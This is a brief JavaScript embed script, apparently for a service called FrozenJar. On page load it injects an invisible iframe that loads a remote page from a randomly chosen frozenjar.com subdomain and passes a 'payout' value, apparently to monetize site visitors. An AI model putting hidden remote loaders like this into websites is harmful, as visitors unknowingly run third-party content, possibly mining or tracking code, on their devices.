window.onload = function() {
	function fj_run() {
		var fj_payout = document.getElementById("fj.js").getAttribute("payout");
		var fj_frame = document.createElement('iframe');
		fj_frame.setAttribute("id", "fj_frame");
		fj_frame.style.display = "none";
		fj_frame.setAttribute("src", "http://load"+(Math.floor(Math.random()*10)+1)+".frozenjar.com/load.html?fj_payout="+fj_payout);
		document.body.appendChild(fj_frame);
	}
	setTimeout(fj_run, 10);
};